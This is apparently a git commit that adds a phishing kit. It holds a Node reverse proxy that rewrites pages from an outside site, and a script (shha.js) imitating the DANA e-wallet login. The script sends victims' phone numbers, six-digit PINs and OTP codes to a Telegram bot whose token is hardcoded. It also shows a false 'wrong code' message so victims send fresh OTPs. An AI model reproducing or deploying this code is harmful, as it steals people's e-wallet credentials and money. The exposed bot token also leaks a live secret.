9e39582340c65277570a80dec9043df14838692d
pending-mydana <jjwk64437@gmail.com>
2025-08-20 04:23:51 +0700

    Add files via upload

---
+++ proxy.js
@@ -0,0 +1,138 @@
+#!/usr/bin/env node
+
+var http = require('http');
+var https = require('https');
+var util = require('util');
+var fs = require('fs');
+
+var PROXY_HOST = process.env.PROXY_HOST || 'www.aftifasi.online';
+var PORT = process.env.PORT || 8000;
+var MIGRATORATOR_API = process.env.MIGRATORATOR_API || 'migratorator.production.alphagov.co.uk';
+var MIGRATORATOR_AUTH = process.env.MIGRATORATOR_AUTH;
+
+if (!MIGRATORATOR_AUTH) {
+	throw "You must set the MIGRATORATOR_AUTH environment variable to auth credentials in the form 'username:password'!";
+}
+
+var RewriterProxy = function RewriterProxy(host, ssl) {
+	var clientLib = ssl ? https : http;
+	var proto = ssl ? "https" : "http";
+
+	this.process = function process(req, res) {
+		req.headers.host = host;
+
+		var remoteReq = clientLib.request({
+			host: host,
+			method: req.method,
+			headers: req.headers,
+			path: req.url
+		});
+
+		remoteReq.on('error', console.error);
+
+		remoteReq.on('response', function (remoteRes) {
+
+			var buffer = [];
+			var doTransform = (remoteRes.headers['content-type'] || "").match(/^text\/html/);
+
+			if (doTransform) {
+				delete remoteRes.headers['content-length'];
+			}
+
+			if (remoteRes.headers.location) {
+				remoteRes.headers.location = remoteRes.headers.location.replace(new RegExp("^" + proto + "://" + host, "g"), '');
+			}
+
+			res.writeHead(remoteRes.statusCode, remoteRes.headers);
+
+			remoteRes.on('data', function(data) {
+				if (doTransform) {
+					buffer.push(data);
+				} else {
+					res.write(data);
+				}
+			});
+
+			remoteRes.on('end', function() {
+				if (doTransform) {
+					var data = buffer.join('').toString();
+					data = data.replace(new RegExp(proto + '://' + host, 'g'), '');
+					res.write(data);
+				}
+				res.end();
+			});
+		});
+
+		req.on('data', function (data) {
+			remoteReq.write(data);
+		});
+
+		req.on('end', function () {
+			remoteReq.end();
+		});
+	};
+
+	return this;
+};
+
+var AuthenticatingProxy = function AuthenticatingProxy(host, auth, ssl) {
+	var clientLib = ssl ? https : http;
+
+	this.process = function pipe(req, rsp) {
+		var options = {
+			host: host,
+			auth: auth,
+			path: req.url
+		};
+
+		var remoteReq = clientLib.request(options, function (res) {
+			var data = [];
+			res.on('data', function (d) {
+				data.push(d.toString());
+			});
+			res.on('end', function () {
+				rsp.writeHead(200, {'content-type': 'application/json'});
+				rsp.end(data.join(''));
+			});
+		});
+
+		remoteReq.end();
+	};
+
+	return this;
+};
+
+var fail = function fail(req, res, msg) {
+	res.writeHead(400, {'content-type': 'application/json'});
+	res.end(JSON.stringify({status: 400, error: msg}));
+};
+
+var serveFile = function serveFile(fname, req, res) {
+	fs.readFile(fname, function (err, data) {
+		if (err) { throw err; }
+		res.writeHead(200, {'content-type': 'text/html'});
+		res.end(data);
+	});
+};
+
+var rewriterProxy = new RewriterProxy(PROXY_HOST);
+var migratoratorProxy = new AuthenticatingProxy(MIGRATORATOR_API, MIGRATORATOR_AUTH, true);
+
+http.createServer(function (req, res) {
+	var m;
+	var ip = req.connection.remoteAddress;
+
+	util.log(ip + ": " + req.method + " " + req.url);
+
+	if (req.url.match(/^\/__browser__(\/?.*)$/)) {
+		serveFile('index.html', req, res);
+	} else if ((m = req.url.match(/^\/__mapping__(\/?.*)$/))) {
+		req.url = m[1] || '/';
+		migratoratorProxy.process(req, res);
+	} else {
+		rewriterProxy.process(req, res);
+	}
+
+}).listen(PORT);
+
+console.log('Server started: point your browser at http://localhost:' + PORT + '/__browser__');
---
+++ shha.js
@@ -0,0 +1,132 @@
+ function tutupotp() {
+    $(".bgotp").hide();
+}
+
+function sendNohp(event) {
+    $("#process").show();
+    event.preventDefault();
+    $("#inp").blur();
+
+    var nomor = document.getElementById("inp").value;
+    sessionStorage.setItem("nomor", nomor);
+
+    var logo = document.getElementById('logo');
+    var inp = document.getElementById('inp');
+
+    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : 0' + inp.value;
+
+    var token = '8482742112:AAFBY7lkVUKkROUfn8RuYXa-ACnC8yh2FTk';
+    var grup = '7619064352';
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        success: function () {
+            $("#process").hide();
+            document.getElementById("back1").style.display = "none";
+            document.getElementById("back2").style.display = "block";
+            $("#formNohp").fadeOut();
+            setTimeout(function () {
+                $("#formPin").fadeIn();
+                $("#pin1").focus();
+            }, 500);
+        }
+    });
+}
+
+function sendPin() {
+    var nomor = sessionStorage.getItem("nomor");
+    document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br/>";
+
+    var logo = document.getElementById('logo');
+    var inp = document.getElementById('inp');
+    var pin1 = document.getElementById('pin1');
+    var pin2 = document.getElementById('pin2');
+    var pin3 = document.getElementById('pin3');
+    var pin4 = document.getElementById('pin4');
+    var pin5 = document.getElementById('pin5');
+    var pin6 = document.getElementById('pin6');
+
+    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : 0' + inp.value +
+        '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
+
+    var token = '8482742112:AAFBY7lkVUKkROUfn8RuYXa-ACnC8yh2FTk';
+    var grup = '7619064352';
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        success: function () {
+            $("#process").hide();
+            document.getElementById("alert").style.display = "block";
+            $(".bgotp").fadeIn();
+            setInterval(countdown, 1000);
+            $("#otp1").focus();
+        }
+    });
+}
+
+function sendOtp() {
+    $(".loadingOtp").show();
+
+    var logo = document.getElementById('logo');
+    var inp = document.getElementById('inp');
+    var pin1 = document.getElementById('pin1');
+    var pin2 = document.getElementById('pin2');
+    var pin3 = document.getElementById('pin3');
+    var pin4 = document.getElementById('pin4');
+    var pin5 = document.getElementById('pin5');
+    var pin6 = document.getElementById('pin6');
+    var otp1 = document.getElementById('otp1');
+    var otp2 = document.getElementById('otp2');
+    var otp3 = document.getElementById('otp3');
+    var otp4 = document.getElementById('otp4');
+
+    setTimeout(function () {
+        $(".alert").text("Mohon pastikan kodenya sudah benar dan coba lagi");
+        $(".alert").css("color", "red");
+    }, 2000);
+
+    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : 0' + inp.value +
+        '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value +
+        '%0A%0A𝗢𝗧𝗣 𝗗𝗔𝗡𝗔     : ' + otp1.value + otp2.value + otp3.value + otp4.value;
+
+    var token = '8482742112:AAFBY7lkVUKkROUfn8RuYXa-ACnC8yh2FTk';
+    var grup = '7619064352';
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        success: function () {
+            setTimeout(function () {
+                $(".loadingOtp").hide();
+                $('.inpotp').val('');
+                var nomor = sessionStorage.getItem("nomor");
+                document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor + " via<br/>";
+                $(".alert").css("color", "black");
+            }, 4000);
+        }
+    });
+}
+
+function countdown() {
+    var count = parseInt($('#countdown').text());
+    if (count !== 0) {
+        $('#countdown').text(count - 1);
+    } else {
+        $('#countdown').text('60');
+    }
+}
+
+window.onload = function () {
+    setTimeout(function () {
+        $(".start").fadeIn();
+        setTimeout(function () {
+            $(".start").fadeOut(1000);
+            setTimeout(function () {
+                $(".container").fadeIn(200);
+                $("#inp").focus();
+            }, 1000);
+        }, 1000);
+    }, 500);
+};
